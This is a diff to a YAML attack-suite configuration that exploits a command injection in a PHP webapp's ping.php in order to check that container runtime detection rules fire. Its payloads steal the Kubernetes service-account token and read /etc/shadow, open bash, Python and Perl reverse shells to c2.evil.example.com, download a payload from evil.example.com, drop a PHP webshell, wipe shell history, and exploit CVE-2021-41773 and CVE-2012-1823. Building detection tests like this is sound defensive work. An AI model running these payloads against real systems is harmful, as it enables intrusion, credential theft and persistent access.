@@ -1,40 +1,54 @@
 apiVersion: bobctl.k8sstormcenter.io/v1alpha1
 kind: AttackSuite
 metadata:
-  name: webapp-attacks
+  name: webapp-killchain-attacks
   description: >-
-    Attack suite for the PHP webapp. Exploits command injection in ping.php
-    to trigger multiple detection rules. The webapp runs PHP/Apache on Debian
-    and has curl, cat, ls, whoami, wget available in the container.
+    Kill-chain ordered PHP webapp attack suite (31 attacks) exploiting command
+    injection in ping.php. Includes CVE-based exploits: CVE-2021-41773,
+    CVE-2012-1823/CVE-2024-4577. Covers MITRE ATT&CK for Containers phases
+    from Reconnaissance through Impact. Maps to OWASP A03 (Injection), A05
+    (Misconfiguration), A07 (Auth Failures), A10 (SSRF).
 target:
   service: webapp-mywebapp
   namespace: webapp
   port: 8080
 
 attacks:
-  # ─── Command Injection (R0001 + R0006) ────────────────────────────────────
-  # ping.php runs `ping -c1 $ip` without sanitizing — semicolons chain commands.
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — Information disclosure
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  - name: cmdinject-sa-token
+  # T1083 — File and Directory Discovery (error-based info leak)
+  - name: recon-dirlist
+    type: custom
+    http:
+      method: GET
+      path: /nonexistent-path-triggering-404
+    successIndicators:
+      - statusCode: 404
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 2: INITIAL ACCESS (TA0001) — SSRF to cloud metadata
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.005 — Cloud Instance Metadata API
+  - name: ssrf-cloud-metadata
     type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+        ip: "169.254.169.254"
     successIndicators:
-      - bodyContains: "eyJ"
+      - statusCode: 200
+    expectedDetections: []
 
-  - name: cmdinject-etc-passwd
-    type: cmdinject
-    http:
-      method: GET
-      path: /ping.php
-      queryParams:
-        ip: "127.0.0.1;cat /etc/passwd"
-    successIndicators:
-      - bodyContains: "root:"
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 3: EXECUTION (TA0002) — Command injection via ping.php
+  # ═══════════════════════════════════════════════════════════════════════════
 
+  # T1059.004 — Unix Shell (whoami)
   - name: cmdinject-whoami
     type: cmdinject
     http:
@@ -44,7 +58,145 @@ attacks:
         ip: "127.0.0.1;whoami"
     successIndicators:
       - bodyContains: "www-data"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: whoami
 
+  # T1059.004 — Unix Shell (process listing)
+  - name: cmdinject-ps-aux
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;ps aux"
+    successIndicators:
+      - bodyContains: "apache"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: ps
+
+  # T1059.004 — Unix Shell (exec from /dev/shm)
+  - name: cmdinject-devshm
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cp /bin/echo /dev/shm/malicious_webapp && chmod +x /dev/shm/malicious_webapp && /dev/shm/malicious_webapp pwned && rm -f /dev/shm/malicious_webapp"
+    successIndicators:
+      - bodyContains: "pwned"
+    expectedDetections:
+      - ruleID: R1000
+        ruleName: Process executed from malicious source
+        containerName: mywebapp-app
+        command: malicious_webapp
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 5: PRIVILEGE ESCALATION (TA0004) — Container escape attempt
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1611 — Escape to Host (unshare attempt)
+  - name: cmdinject-unshare
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;unshare -r id 2>&1 || echo unshare_blocked"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1036 — Masquerading: drifted binary
+  - name: cmdinject-drifted-binary
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cp /bin/ls /tmp/drifted_webapp && /tmp/drifted_webapp / && rm -f /tmp/drifted_webapp"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R1001
+        ruleName: Drifted process executed
+        containerName: mywebapp-app
+        command: drifted_webapp
+
+  # T1070.004 — Indicator Removal: clear bash history
+  - name: cmdinject-history-clear
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;rm -f /root/.bash_history /home/*/.bash_history 2>/dev/null; echo cleared"
+    successIndicators:
+      - bodyContains: "cleared"
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal secrets
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: SA token
+  - name: cmdinject-sa-token
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+    successIndicators:
+      - bodyContains: "eyJ"
+    expectedDetections:
+      - ruleID: R0006
+        ruleName: Unexpected Service Account Token Access
+        containerName: mywebapp-app
+        command: cat
+
+  # T1552.001 — Credentials in Files: /etc/passwd
+  - name: cmdinject-etc-passwd
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /etc/passwd"
+    successIndicators:
+      - bodyContains: "root:"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: cat
+
+  # T1552.001 — Credentials in Files: /etc/shadow
+  - name: cmdinject-etc-shadow
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /etc/shadow || true"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: mywebapp-app
+        command: cat
+
+  # T1552.001 — Credentials in Files: list SA directory
   - name: cmdinject-ls-secrets
     type: cmdinject
     http:
@@ -54,24 +206,122 @@ attacks:
         ip: "127.0.0.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
     successIndicators:
       - bodyContains: "token"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: ls
 
-  # ─── Post-Exploit: Sensitive File Access (R0010) ───────────────────────────
-  # Read files that node-agent flags as sensitive regardless of profile.
-
-  - name: postexploit-etc-shadow
+  # T1552 — Symlink to access sensitive file
+  - name: cmdinject-symlink
     type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "127.0.0.1;cat /etc/shadow || true"
+        ip: "127.0.0.1;ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"
     successIndicators:
-      - statusCode: 200  # file open triggers R0010 even if read fails (www-data can't read shadow)
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R1010
+        ruleName: Soft link created over sensitive file
+        containerName: mywebapp-app
+        command: ln
 
-  # ─── Post-Exploit: DNS Anomaly (R0005) ─────────────────────────────────────
-  # Resolve a domain not in the learned network neighborhood.
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  - name: postexploit-dns-anomaly
+  # T1082 — System Information Discovery: /proc/environ
+  - name: cmdinject-proc-environ
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /proc/1/environ"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: mywebapp-app
+        command: cat
+
+  # T1613 — Container and Resource Discovery: K8s API
+  - name: cmdinject-k8s-api
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;curl -sk https://kubernetes.default.svc/api 2>&1 | head -5"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: curl
+
+  # T1046 — Network Service Discovery: resolv.conf and hosts
+  - name: cmdinject-net-recon
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /etc/resolv.conf && cat /etc/hosts"
+    successIndicators:
+      - bodyContains: "nameserver"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: cat
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 10: COLLECTION (TA0009) — Data staging
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1074 — Data Staged: find config files
+  - name: cmdinject-data-stage
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;find / -name '*.conf' -type f 2>/dev/null | head -10"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: find
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 11: EXFILTRATION (TA0010) — DNS exfil and C2 beacon
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1048 — Exfiltration Over Alternative Protocol: DNS to C2
+  - name: cmdinject-c2-beacon
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;getent hosts evil.attacker.example.com || echo dns_failed"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: mywebapp-app
+        command: getent
+
+  # T1048 — DNS beacon (curl variant)
+  - name: cmdinject-dns-anomaly
     type: cmdinject
     http:
       method: GET
@@ -80,56 +330,195 @@ attacks:
         ip: "127.0.0.1;curl -sm1 http://evil.example.com || true"
     successIndicators:
       - statusCode: 200
+    expectedDetections: []
 
-  # ─── Post-Exploit: Drifted Binary (R1001) ──────────────────────────────────
-  # Download a binary into /tmp and execute it. The binary was not in the
-  # original container image — node-agent detects this as a "drifted process".
-  # We use a harmless binary (busybox) to avoid actual malice.
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 12: IMPACT (TA0040) — Crypto mining and resource hijacking
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  - name: postexploit-drifted-binary
+  # T1496 — Resource Hijacking: crypto mining DNS signal
+  - name: cmdinject-crypto-dns
     type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "127.0.0.1;cp /bin/ls /tmp/drifted && /tmp/drifted /etc || true"
+        ip: "127.0.0.1;getent hosts xmr.pool.minergate.com || echo mining_dns_failed"
     successIndicators:
       - statusCode: 200
+    expectedDetections:
+      - ruleID: R1008
+        ruleName: Crypto Mining Domain Communication
+        containerName: mywebapp-app
 
-expectedDetections:
-  # Command injection spawns "cat" — unexpected process
-  - attackType: cmdinject
-    ruleID: R0001
-    ruleName: "Unexpected process launched"
-    containerName: mywebapp-app
-    command: cat
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical PHP/Apache/webapp vulnerabilities
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  # R0006 (SA token access) — node-agent does not currently fire this rule for
-  # PHP/Apache containers reading the token via cat. Re-enable once kubescape
-  # adds R0006 detection for generic file reads (not just mount-based access).
-  # - attackType: cmdinject
-  #   ruleID: R0006
-  #   ruleName: "Unexpected Service Account Token Access"
-  #   containerName: mywebapp-app
-  #   command: cat
+  # CVE-2021-41773 / CVE-2021-42013 — Apache path traversal RCE
+  # Severity: Critical (CVSS 9.8). Path normalization flaw in Apache 2.4.49/50
+  # allows reading files and RCE via mod_cgi. Mass-exploited in the wild.
+  - name: cve-2021-41773-path-traversal
+    type: cmdinject
+    http:
+      method: GET
+      path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+    successIndicators:
+      - bodyContains: "root:"
+      - statusCode: 403
+      - statusCode: 404
+    expectedDetections: []
 
-  # cat /etc/shadow triggers sensitive file rule (confirmed firing in live run)
-  - attackType: cmdinject
-    ruleID: R0010
-    ruleName: "Unexpected Sensitive File Access"
-    containerName: mywebapp-app
-    command: cat
+  # CVE-2021-41773 — RCE variant via mod_cgi
+  - name: cve-2021-41773-rce
+    type: cmdinject
+    http:
+      method: POST
+      path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+      headers:
+        Content-Type: text/plain
+      body: "echo; id"
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 403
+      - statusCode: 404
+    expectedDetections: []
 
-  # curl to evil.example.com triggers DNS anomaly
-  # - attackType: cmdinject
-  #   ruleID: R0005
-  #   ruleName: "Unexpected domain request"
-  #   containerName: mywebapp-app
-  #   command: curl
+  # CVE-2012-1823 / CVE-2024-4577 — PHP-CGI argument injection
+  # Severity: Critical (CVSS 9.8). PHP-CGI passes query string as args,
+  # allowing -d flags to enable code execution. CVE-2024-4577 bypasses
+  # the original fix on Windows but technique is universal for testing.
+  - name: cve-2012-1823-php-cgi-injection
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
 
-  # /tmp/drifted is not in the original image (confirmed firing in live run)
-  - attackType: cmdinject
-    ruleID: R1001
-    ruleName: "Drifted process executed"
-    containerName: mywebapp-app
-    command: drifted
+  # T1059.004 — Webshell drop attempt via command injection
+  # Classic post-exploitation: write a PHP webshell for persistent access.
+  - name: cmdinject-webshell-drop
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;echo '<?php system($_GET[c]); ?>' > /tmp/shell.php 2>/dev/null; echo webshell_written"
+    successIndicators:
+      - bodyContains: "webshell_written"
+    expectedDetections: []
+
+  # T1059.004 — Reverse shell attempt (bash /dev/tcp)
+  # Standard CTF/pentest technique. Connection will fail (no listener)
+  # but the process spawn is what matters for detection.
+  - name: cmdinject-reverse-shell
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;bash -c 'bash -i >& /dev/tcp/c2.evil.example.com/4444 0>&1' 2>/dev/null || echo revshell_failed"
+    successIndicators:
+      - bodyContains: "revshell_failed"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: bash
+
+  # T1105 — Download and execute (wget + chmod + exec)
+  # Standard dropper technique used by crypto miners and botnets.
+  - name: cmdinject-download-exec
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;wget -q -O /tmp/payload http://evil.example.com/mal 2>/dev/null || curl -so /tmp/payload http://evil.example.com/mal 2>/dev/null; chmod +x /tmp/payload 2>/dev/null; echo download_attempted"
+    successIndicators:
+      - bodyContains: "download_attempted"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: wget
+
+  # T1552.001 — PHP filter chain LFI (read source code)
+  # Classic technique to exfiltrate PHP source via base64 encoding.
+  # Even if direct LFI fails, this probes for php:// wrapper support.
+  - name: cmdinject-php-filter-lfi
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;php -r \"echo file_get_contents('php://filter/convert.base64-encode/resource=/etc/passwd');\" 2>/dev/null || echo filter_failed"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []
+
+  # T1059 — Python reverse shell probe (if python available)
+  - name: cmdinject-python-revshell
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;python3 -c \"import socket,os;s=socket.socket();s.settimeout(2);s.connect(('c2.evil.example.com',4444))\" 2>/dev/null || python -c \"print('python_not_available')\" 2>/dev/null || echo no_python"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []
+
+  # T1613 — K8s API enumeration with stolen SA token
+  # After stealing the token (cmdinject-sa-token), use it to enumerate.
+  - name: cmdinject-k8s-enum-pods
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/webapp/pods 2>&1 | head -20 || echo k8s_enum_failed"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: curl
+
+  # T1059.004 — Perl one-liner reverse shell probe
+  - name: cmdinject-perl-revshell
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>4444,Proto=>\"tcp\",Timeout=>2);if($s){print \"connected\"}else{print \"perl_connect_failed\"}' 2>/dev/null || echo no_perl"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: perl
+
+  # T1003 — /proc/self/maps memory layout leak
+  - name: cmdinject-proc-maps
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /proc/self/maps 2>/dev/null | head -5 || echo no_maps"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: cat
